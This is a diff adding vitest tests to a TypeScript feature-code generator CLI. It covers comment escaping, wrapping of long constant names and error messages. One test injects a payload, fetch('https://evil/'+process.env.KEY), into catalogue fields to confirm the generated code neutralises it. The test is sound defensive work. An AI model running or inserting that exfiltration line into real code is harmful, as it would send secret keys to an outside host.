@@ -2,9 +2,11 @@ import { execFileSync } from "node:child_process";
 import { mkdtemp, readFile, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
+import ts from "typescript";
 import { afterEach, describe, expect, it, vi } from "vitest";
 import { main } from "../../src/command.js";
-import { constantNames, type FeatureSource, renderFeatures, sameFeatures } from "../../src/generate.js";
+import { constantNames, type FeatureSource, holdsConstants, renderFeatures, sameFeatures } from "../../src/generate.js";
+import { ApiError, ConnectionError, EntitlerServer, TimeoutError } from "../../src/index.js";
 import { apiError, fakeFetch, json } from "./fake.js";
 
 afterEach(() => {
@@ -153,6 +155,52 @@ describe("renderFeatures", () => {
     ]);
   });
 
+  it("keeps catalogue values inside the comments they are written into", () => {
+    const injected = "fetch('https://evil/'+process.env.KEY)//";
+    const source = renderFeatures({
+      environment: { name: `Live\n${injected}` },
+      track: { name: `Beta\r${injected}\u2028${injected}` },
+      release: null,
+      change: `chg_1\u2029${injected}`,
+      features: [
+        feature("export_pdf", {
+          name: `Export */ ${injected}\n${injected}`,
+          description: `First\rsecond\u2028third\u2029*/ ${injected}`,
+          unit: `pages\n*/ ${injected}`,
+        }),
+        feature("bundle", { type: "group", includes: ["export_pdf", `x*/\n${injected}`] }),
+        feature("odd*/\u2028x"),
+      ],
+    });
+    const code = ts.transpileModule(source, { compilerOptions: { removeComments: true } }).outputText;
+    expect(code).not.toContain("process.env");
+    expect(code).not.toContain("evil");
+    expect(source.split("\n")[1]).toBe(
+      `// Read from Live ${injected}, Beta ${injected} ${injected}, change chg_1 ${injected}.`,
+    );
+    expect(source).not.toMatch(/[\r\u2028\u2029]/);
+    expect(source).toContain(`   * Export *\\/ ${injected} ${injected}\n`);
+    expect(source).toContain("   * First\n   * second\n   * third\n");
+    expect(source).toContain(`   * Counted in pages *\\/ ${injected}.`);
+    expect(source).toContain(`   * Includes export_pdf, x*\\/ ${injected}.`);
+    expect(source).toContain("  /** odd*\\/ x */");
+    expect(source).toContain('defineFeature("odd*/\\u2028x", "boolean")');
+  });
+
+  it("keeps the names of constants wrapped onto their own line", () => {
+    const long = "a_feature_key_long_enough_that_its_constant_name_alone_overflows_the_whole_line";
+    const wrapped = renderFeatures({ ...catalogue, features: [feature(long)] });
+    const base = constantNames([long]).get(long) as string;
+    expect(wrapped).toContain(`  ${base}:\n    defineFeature(`);
+    expect(holdsConstants(wrapped)).toBe(true);
+    const renamed = wrapped.replace(`${base}:`, `${base}Kept:`);
+    expect(constantNames([long], renamed).get(long)).toBe(`${base}Kept`);
+    const colliding = long.replace(/_/g, "-");
+    const names = constantNames([colliding, long], wrapped);
+    expect(names.get(long)).toBe(base);
+    expect(names.get(colliding)).toBe(`${base}2`);
+  });
+
   it("compares files ignoring the Read from line", () => {
     const a = renderFeatures(catalogue);
     const b = renderFeatures({ ...catalogue, release: 3 });
@@ -295,6 +343,52 @@ describe("entitler generate", () => {
     expect((await run(["generate", "--out", await temp()])).code).toBe(0);
   });
 
+  it("never overwrites constants wrapped onto their own line with an empty list", async () => {
+    const long = "a_feature_key_long_enough_that_its_constant_name_alone_overflows_the_whole_line";
+    const file = await temp();
+    vi.stubGlobal("fetch", fakeFetch(json({ ...listing, features: [{ ...listing.features[0], key: long }] })).fetch);
+    await run(["generate", "--out", file]);
+    expect(await readFile(file, "utf8")).toMatch(/:\n {4}defineFeature\(/);
+    vi.stubGlobal("fetch", fakeFetch(json({ ...listing, features: [] })).fetch);
+    expect((await run(["generate", "--out", file])).code).toBe(1);
+    expect(await readFile(file, "utf8")).toContain(long);
+  });
+
+  it("prints an argument error as it is, with no request", async () => {
+    const { fetch: fake, sent } = fakeFetch(json(listing));
+    vi.stubGlobal("fetch", fake);
+    expect(await run(["generate", "--out", await temp(), "--key", "ent_pk_live_x"])).toEqual({
+      code: 1,
+      stdout: "",
+      stderr: "A publishable key belongs in EntitlerClient. Use a secret key from the dashboard on your server.\n",
+    });
+    expect(sent).toHaveLength(0);
+  });
+
+  it("names only real connection failures and timeouts by their code", async () => {
+    const spy = vi.spyOn(EntitlerServer.prototype, "features");
+    spy.mockRejectedValueOnce(new ConnectionError("Entitler could not be reached."));
+    expect((await run(["generate", "--out", await temp()])).stderr).toBe(
+      "Entitler request failed: Entitler could not be reached (connection_failed).\n",
+    );
+    spy.mockRejectedValueOnce(
+      new ApiError({ status: 500, code: "internal_error", message: "Boom.", requestId: undefined }),
+    );
+    expect((await run(["generate", "--out", await temp()])).stderr).toBe(
+      "Entitler request failed: Boom (internal_error).\n",
+    );
+    spy.mockRejectedValueOnce(new TimeoutError("Entitler did not answer within 10 ms."));
+    expect((await run(["generate", "--out", await temp()])).stderr).toBe(
+      "Entitler request failed: Entitler did not answer within 10 ms (timed_out).\n",
+    );
+    spy.mockRejectedValueOnce(new Error("Something unexpected."));
+    expect(await run(["generate", "--out", await temp()])).toEqual({
+      code: 1,
+      stdout: "",
+      stderr: "Entitler request failed: Something unexpected.\n",
+    });
+  });
+
   it("rethrows unexpected file errors", async () => {
     vi.stubGlobal("fetch", fakeFetch(json(listing)).fetch);
     await expect(run(["generate", "--out", tmpdir()])).rejects.toThrow();
@@ -345,5 +439,14 @@ describe("entitler snapshot-keys", () => {
       "Entitler request failed: Try again (unavailable).\n",
     );
     expect((await run(["snapshot-keys", "--key", "k"])).stderr).toContain("Unknown option --key.");
+  });
+
+  it("names no code for an error that is not a request failure", async () => {
+    vi.spyOn(EntitlerServer.prototype, "snapshotKeys").mockRejectedValueOnce(new Error("Something unexpected."));
+    expect(await run(["snapshot-keys", "--out", join(tmpdir(), "never.json")])).toEqual({
+      code: 1,
+      stdout: "",
+      stderr: "Entitler request failed: Something unexpected.\n",
+    });
   });
 });
